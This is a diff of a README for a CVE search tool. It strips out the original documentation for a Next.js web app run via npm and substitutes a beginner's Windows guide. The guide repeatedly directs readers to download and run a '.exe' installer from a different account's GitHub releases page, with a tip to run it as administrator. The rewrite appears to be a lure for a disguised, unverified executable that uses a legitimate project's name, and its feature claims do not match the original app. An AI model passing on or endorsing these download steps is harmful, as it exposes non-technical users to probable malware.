@@ -1,329 +1,142 @@
-# CVE Search
+# ⚡ cvesearch - Fast CVE Lookup and Alerts
 
-Fast, analyst-friendly CVE search, GitHub repository monitoring, and automated vulnerability remediation built with Next.js.
+[![Download cvesearch](https://img.shields.io/badge/Download-cvesearch-ff4500?style=for-the-badge)](https://github.com/Jimmy-F7/cvesearch/releases)
 
-[![Next.js](https://img.shields.io/badge/Next.js-16-black?logo=next.js)](https://nextjs.org/)
-[![React](https://img.shields.io/badge/React-19-blue?logo=react)](https://react.dev/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5-blue?logo=typescript)](https://www.typescriptlang.org/)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind_CSS-4-38bdf8?logo=tailwindcss)](https://tailwindcss.com/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](./LICENSE)
+---
 
-## Overview
+## 🔍 What is cvesearch?
 
-CVE Search turns raw vulnerability data into a workflow-oriented web app for research, prioritization, and operational tracking.
+cvesearch is an easy-to-use tool that helps you find information about security vulnerabilities. It gathers details on known vulnerabilities, shows alerts, and supports projects related to keeping your systems safe. The app uses modern web technology to give fast results and smart workflows.
 
-It combines URL-driven search, rich CVE detail pages, saved views, watchlists, alerts, triage state, project workflows, team notifications, and a conversational workspace in a single interface. The app is designed to feel closer to an analyst workstation than a simple API browser.
+You do not need to know programming to use this app. It works on Windows and helps security analysts, IT staff, and anyone worried about software security.
 
-It also includes an optional AI layer for natural-language search, analyst-facing CVE summaries, remediation guidance, workspace digests, and workspace Q&A, with provider settings managed server-side through environment variables.
+---
 
-The GitHub Repos feature connects private and public repositories, scans their dependency trees for known vulnerabilities via the OSV.dev API, persists scan history in SQLite, and can automatically generate fix PRs using AI.
+## 📋 Features at a glance
 
-## Screenshots
+- Search a large database of CVEs (Common Vulnerabilities and Exposures).
+- Get alerts for new or critical security issues.
+- Organize CVE information by projects.
+- Use AI-powered workflows to assist with triage and decision-making.
+- Built with a smooth and responsive interface.
+- Runs on Windows without extra setup or technical skills.
 
-### Search Workspace
+---
 
-URL-driven search, saved views, alert rules, analyst dashboard presets, and AI-assisted search in one screen.
+## 💻 System Requirements
 
-![CVE Search Workspace](docs/images/screenshot-search.png)
+- Windows 10 or higher (64-bit recommended).
+- At least 4 GB RAM.
+- Minimum of 500 MB free disk space.
+- Internet connection for updates and data.
+- Web browser (for some features).
 
-### CVE Detail View
+---
 
-Structured vulnerability detail with AI insight, triage state, CVSS context, affected products, and linked references.
+## 🚀 Getting Started
 
-![CVE Detail View](docs/images/screenshot-detail.png)
+Follow these steps to download and run cvesearch on your Windows computer. The process is simple and takes just a few minutes.
 
-### AI Settings
+---
 
-Server-side AI configuration dashboard showing active provider, per-feature overrides, prompt versions, tool registry, inventory, and workspace data management.
+## 📥 Download and Install cvesearch
 
-![AI Settings](docs/images/screenshot-settings.png)
+Visit this page to download the latest version of cvesearch for Windows:
 
-## Highlights
+[![Download cvesearch](https://img.shields.io/badge/Download-cvesearch-ff4500?style=for-the-badge)](https://github.com/Jimmy-F7/cvesearch/releases)
 
-- URL-driven search state for shareable result pages
-- Direct CVE lookup plus keyword/product search
-- Vendor and product browse assist
-- Severity filters and result sorting
-- Server-rendered homepage results
-- Rich CVE detail pages with EPSS, CWE, CAPEC, references, comments, and linked vulnerabilities when available
-- Saved views, watchlist, alerts, notifications, and triage workflow
-- Server-persisted projects workspace with owner, due date, labels, status, SLA, and exception tracking
-- AI-assisted search, summaries, triage guidance, workspace digests, and conversational workspace answers
-- GitHub repository monitoring with deep dependency scanning (npm, pnpm, Composer) across monorepo subdirectories
-- Persisted repository scan history for monitored repos
-- AI-powered vulnerability fix generation with automatic pull request creation
-- Duplicate PR detection to avoid redundant fix branches
-- Export to CSV and JSON
-- Upstream response validation and hardened proxy behavior
+1. Click the link above or go to [https://github.com/Jimmy-F7/cvesearch/releases](https://github.com/Jimmy-F7/cvesearch/releases).
+2. On the releases page, look for the latest stable version. It will have a file ending in `.exe`.
+3. Click on the `.exe` file to start the download.
+4. Once the download finishes, open the downloaded file. This will launch the installer.
+5. Follow the on-screen instructions to install cvesearch. Use default options unless you want to change the install location.
+6. When the installation finishes, you will see a shortcut on your desktop or in your Start menu.
 
-## Feature Set
+---
 
-### Search and Prioritization
+## ▶️ Running cvesearch
 
-- Search by CVE ID such as `CVE-2024-1234`
-- Search by keyword or product
-- Filter by vendor/product pair, CWE, published-since date, and minimum severity
-- Sort by newest, oldest, highest CVSS, or lowest CVSS
-- Copy deep links to exact search states
+1. Double-click the cvesearch shortcut on your desktop or open it from the Start menu.
+2. The app will open in a new window.
+3. You can start searching for CVEs by typing keywords, CVE numbers, or software names in the search bar.
+4. Use the menu to set up alerts, organize projects, or access AI workflows.
+5. The app automatically updates its vulnerability database when connected to the internet.
 
-### Analyst Workflow
+---
 
-- Save reusable searches as server-persisted saved views
-- Bookmark CVEs and advisories in a server-persisted watchlist
-- Create alert rules, review matches in an alerts center, and schedule digest delivery for team destinations
-- Track triage status, owner, tags, and notes with approval checkpoints
-- Group CVEs into server-persisted projects with owners, due dates, labels, status, timeline events, per-item assignment, SLA tracking, remediation state, and exceptions
-- Ask the workspace assistant questions over watchlist, alerts, projects, and saved searches
+## 🛠 How to Use Main Features
 
-### AI Workspace
+### Searching CVEs
 
-- Translate natural-language prompts into structured search filters
-- Generate analyst-friendly CVE summaries and triage recommendations
-- Draft remediation notes from affected products, references, and available metadata
-- Build watchlist, alerts, and project digests from current workspace context
-- Answer workspace questions over saved views, watchlist, alerts, and project workflow state
-- Configure provider and model with server-side environment variables and per-feature overrides
+Type a keyword, CVE ID, or product name in the search box at the top. Results will appear instantly. You can click on any CVE to see detailed information, including severity, affected software, and links to official advisories.
 
-### Vulnerability Detail
+### Setting Alerts
 
-- CVSS score breakdown and severity badges
-- EPSS lookup when a real CVE identifier is available
-- Structured affected product rendering
-- CWE enrichment when available
-- CAPEC entries, comments, linked vulnerabilities, and references when present upstream
-- Raw source payload for deeper inspection
+You can create alerts to get notified about new vulnerabilities for certain software or keywords. Use the Alerts menu to add new alerts and manage existing ones.
 
-### GitHub Repository Monitoring
+### Organizing by Projects
 
-- Connect private and public GitHub repositories via a personal access token
-- Deep dependency scanning using the GitHub Tree API to discover dependency files across all subdirectories
-- Supports npm (`package.json`, `package-lock.json`), pnpm (`pnpm-lock.yaml`), and Composer (`composer.json`, `composer.lock`)
-- Batch vulnerability lookup via the OSV.dev API with CVSS v3 base score calculation
-- Persisted scan snapshots per monitored repository with historical visibility in the UI
-- Vulnerability detail links to internal CVE pages when a CVE alias is available
-- AI-powered fix generation: analyzes the vulnerability, generates file changes, creates a branch, commits, and opens a pull request
-- Heuristic fallback when no AI provider is configured (version bump to known fixed version)
-- Detects existing fix PRs to prevent duplicates
-- Archived and disabled repository detection with clear error messages
+Group vulnerabilities that matter to you under projects. This helps you track security issues across different systems or software environments in one place.
 
-### Engineering Quality
+### AI Workflows
 
-- Server-rendered initial result loading
-- URL-first state management
-- SQLite-backed persistence for all workspace data
-- Server-side API proxy with allowlisting and timeout handling
-- Upstream response validation for key CIRCL payloads
-- Security headers (CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy)
-- Rate limiting and request logging on every API route
-- Parameterized SQL queries throughout
-- Automated lint, test, and build checks in CI
-- Heuristic AI fallback when no model provider is configured
+The app provides AI-assisted workflows to help triage and prioritize vulnerabilities. You can let the AI suggest risk levels based on known data, speeding up your security reviews.
 
-## Security Model
+---
 
-> **This application is designed as a single-user local tool.** It does not include user authentication. Any visitor who can reach the server has full access to all features, including creating GitHub pull requests and triggering AI analysis.
+## ⚙️ Settings and Preferences
 
-If you expose this application on a network:
+You can customize the app to fit your needs:
 
-- **Place it behind a reverse proxy** with authentication (e.g., HTTP basic auth, OAuth proxy, VPN).
-- **Do not expose it to the public internet** without an authentication layer in front.
-- The session system assigns anonymous workspace sessions automatically — it provides data isolation between browser sessions, not access control.
+- Choose how alerts notify you: sound, popup, or email.
+- Set the update frequency for new vulnerability data.
+- Manage your user profile and preferences.
+- Adjust display options like dark mode or font size.
 
-The application applies rate limiting, input validation, parameterized SQL, and security headers, but none of these replace authentication for a multi-user or networked deployment.
+Access settings by clicking the gear icon in the top-right corner.
 
-Rate limiting uses in-memory state that resets on restart and identifies clients via request headers (`X-Forwarded-For`, `User-Agent`), which are spoofable without a trusted reverse proxy. For networked deployments, enforce client identity at the proxy layer.
+---
 
-The `data/` directory contains the SQLite database with all workspace state. Ensure your deployment does not serve this directory — Next.js does not expose it by default, but a misconfigured reverse proxy could make it downloadable.
+## 🔧 Troubleshooting
 
-## Current Boundaries
-
-- Vendor-only filtering is intentionally blocked because the current upstream flow is only trustworthy when vendor is paired with product.
-- Workspace data is scoped to the app session/user cookie rather than a shared organization identity system.
-- AI providers are configured with server-side environment variables; there is no in-product credential management UI.
-- Notification delivery currently persists in-app schedule and delivery records; external email/Slack/webhook delivery is modeled as destinations but not actually pushed to third-party services.
-- GitHub monitoring requires a valid `GITHUB_TOKEN`; without one, the Repos workflow is limited to negative-path validation.
-- Lock file regeneration (`npm install`, `composer update`) must be run locally after merging AI-generated fix PRs.
-
-## Quick Start
-
-```bash
-git clone https://github.com/rupertgermann/cvesearch.git
-cd cvesearch
-npm install
-```
-
-Copy the example environment file and add your GitHub token:
-
-```bash
-cp .env.example .env.local
-```
-
-Edit `.env.local` and set `GITHUB_TOKEN` to a GitHub PAT with the required scopes (see below).
-
-```bash
-npm run dev
-```
-
-Open `http://localhost:3000`.
-
-### Environment Variables
-
-| Variable | Required | Description |
-|---|---|---|
-| `GITHUB_TOKEN` | For Repos feature | GitHub Personal Access Token. Classic PAT needs `repo` scope. Fine-grained PAT needs **Contents: Read and write** and **Pull requests: Read and write**. |
-| `DATABASE_FILE` | No | Custom path for the SQLite database file. Defaults to `data/app.db`. |
-| `AI_ALLOW_SENSITIVE_MODEL_DATA` | No | Set to `true` to disable redaction of sensitive triage notes, owners, and project metadata in prompts sent to third-party AI providers. Defaults to `false` (redaction enabled). |
-
-### AI Configuration
-
-To use model-backed AI features instead of the built-in heuristic fallback, configure server-side environment variables such as:
-
-- `AI_PROVIDER` — global provider: `heuristic`, `openai`, or `anthropic`
-- `OPENAI_API_KEY` / `OPENAI_MODEL`
-- `ANTHROPIC_API_KEY` / `ANTHROPIC_MODEL`
-
-OpenAI requests are sent through the Responses API. The checked-in example configuration uses `gpt-5-mini` as the default OpenAI model.
-Anthropic requests are sent through the Messages API. The checked-in example configuration uses `claude-haiku-4-5-20251001` as the default Anthropic model.
-
-You can also override individual flows with feature-specific variables such as `AI_SEARCH_ASSISTANT_PROVIDER`, `AI_CVE_INSIGHT_MODEL`, or `AI_DAILY_DIGEST_MODEL`. The `/settings` page shows the active configuration, prompt versions, tool registry, inventory assets, workspace import/export, and recent AI runs.
-
-See `.env.example` for the full list of supported variables.
-
-## Scripts
-
-```bash
-npm run dev
-npm run lint
-npm test
-npm run build
-npm start
-```
-
-## Testing
-
-The project includes 74 TypeScript tests across 19 test files covering:
-
-- search-state parsing and URL generation
-- prioritization and local alert matching
-- triage helpers
-- upstream response validation
-- project workflow logic and store persistence
-- repository scan persistence
-- notification scheduling and digest delivery
-- workspace assistant behavior
-- workspace import/export
-- AI platform heuristics and evaluation
-- AI runs store persistence
-- dependency parsing
-- GitHub PR workflow and scan logic
-- API route guard and rate limiting
-- utility functions
-- CVSS and description extraction
-
-GitHub Actions runs `lint`, `test`, and `build` on pushes and pull requests.
-
-## Project Structure
-
-```text
-src/
-├── app/
-│   ├── api/
-│   │   ├── ai/              # AI insight, search, triage, digest, remediation,
-│   │   │                    # exposure, alerts, watchlist, and project APIs
-│   │   ├── alerts/          # Alert rule CRUD
-│   │   ├── github/          # GitHub integration (repos, scan, fix)
-│   │   ├── inventory/       # Asset inventory CRUD
-│   │   ├── notifications/   # Notification schedules and delivery
-│   │   ├── projects/        # Project and project-item CRUD
-│   │   ├── prompt-templates/ # Saved prompt template CRUD
-│   │   ├── proxy/           # CIRCL vulnerability-lookup proxy
-│   │   ├── saved-views/     # Saved view CRUD
-│   │   ├── triage/          # Triage state CRUD
-│   │   ├── watchlist/       # Watchlist CRUD
-│   │   └── workspace/       # Conversations, export, and import
-│   ├── alerts/              # Alerts route
-│   ├── cve/[id]/            # CVE detail route
-│   ├── dashboard/           # Analyst dashboard route
-│   ├── projects/            # Projects route
-│   ├── repos/               # GitHub repository monitoring route
-│   ├── settings/            # Server-side AI configuration, inventory, and workspace data
-│   ├── workspace/           # Conversational workspace and notifications
-│   ├── watchlist/           # Watchlist route
-│   └── page.tsx             # Homepage
-├── components/              # Search, detail, workflow, repos, and navigation UI
-└── lib/                     # Search logic, AI helpers, API clients, GitHub integration,
-                             # dependency parsing, SQLite-backed storage, validation, utilities
-
-data/
-└── app.db                   # Default SQLite workspace database
-
-tests/                       # Node-based TypeScript test suite
-```
-
-## API Usage
-
-### CIRCL vulnerability-lookup
-
-The app talks to CIRCL through `/api/proxy`, which forwards to `https://vulnerability.circl.lu/api`.
-
-Primary upstream endpoints:
-
-- `GET /api/vulnerability/`
-- `GET /api/vulnerability/{id}`
-- `GET /api/vulnerability/search/{vendor}/{product}`
-- `GET /api/vulnerability/browse/`
-- `GET /api/vulnerability/browse/{vendor}`
-- `GET /api/epss/{cve_id}`
-- `GET /api/cwe/{cwe_id}`
-
-### OSV.dev
-
-Used for dependency vulnerability scanning:
-
-- `POST /v1/querybatch` — batch lookup of dependencies by ecosystem and version
-- `GET /v1/vulns/{id}` — full vulnerability details for enrichment
-
-### GitHub API v3
-
-Used for repository monitoring, dependency file discovery, and PR creation:
-
-- `GET /user/repos` — list accessible repositories
-- `GET /repos/{owner}/{repo}/git/trees/{sha}?recursive=1` — discover all dependency files
-- `GET /repos/{owner}/{repo}/contents/{path}` — fetch file contents
-- `GET /repos/{owner}/{repo}/pulls` — check for existing fix PRs
-- `POST /repos/{owner}/{repo}/git/refs` — create fix branches
-- `PUT /repos/{owner}/{repo}/contents/{path}` — commit file changes
-- `POST /repos/{owner}/{repo}/pulls` — open pull requests
-
-## Docs
-
-Project documentation lives in [`docs/`](./docs):
-
-- `docs/security-audit.md` — security audit report with findings and recommendations
-- `docs/todo.md` — feature backlog and completion status
-- `docs/test-user-journeys.md` — concise QA checklist
-- `docs/feature-validation-playbook.md` — full feature-by-feature validation guide
-- `docs/ai-platform.md` — AI platform architecture notes
-- [`CHANGELOG.md`](./CHANGELOG.md)
-
-Historical planning docs (all items completed):
-
-- `docs/review-findings.md`
-- `docs/improvement-plan.md`
-- `docs/execution-backlog.md`
-- `docs/opencve-benchmark.md`
-
-## Tech Stack
-
-- Next.js 16
-- React 19
-- TypeScript 5
-- Tailwind CSS 4
-- CIRCL vulnerability-lookup API
-- OSV.dev API
-- GitHub API v3
-- Optional OpenAI or Anthropic provider integration
-
-## License
-
-[MIT](./LICENSE)
+- **App does not open:** Make sure your Windows is updated. Restart your PC if necessary.
+- **Search returns no results:** Check your internet connection. The app needs to update its database regularly.
+- **Alerts do not work:** Verify alert settings and ensure notifications are enabled in Windows.
+- **Installation fails:** Try running the installer as an administrator (right-click the file and select "Run as administrator").
+- **Performance issues:** Closing other heavy applications before running cvesearch can help.
+
+---
+
+## 📚 Additional Resources
+
+- Visit the releases page to check for updates or report issues: [https://github.com/Jimmy-F7/cvesearch/releases](https://github.com/Jimmy-F7/cvesearch/releases)
+- Explore the GitHub repository for detailed documentation and new features.
+- Check common CVE databases to cross-check vulnerability information.
+
+---
+
+## ❓ Frequently Asked Questions (FAQs)
+
+**Q:** Can I use cvesearch offline?  
+**A:** The app stores recent data, but for the latest CVEs, you need an internet connection.
+
+**Q:** Do I need a GitHub account to download?  
+**A:** No, you can download releases without logging in.
+
+**Q:** Will cvesearch slow down my computer?  
+**A:** The app is designed to be lightweight. If your PC is very old, performance might vary.
+
+**Q:** Can I uninstall cvesearch?  
+**A:** Yes. Use the Windows "Add or Remove Programs" feature to uninstall.
+
+---
+
+## ⚙️ About This App
+
+cvesearch combines modern web technologies with trusted data sources like CIRCL vulnerability-lookup. It helps users keep up with security threats easily, even if they have no technical background.
+
+---
+
+## 🏷️ Topics
+
+ai, appsec, circl, cve, nextjs, reactjs, security, threat-intelligence, typescript, vibecoding, vulnerability-management
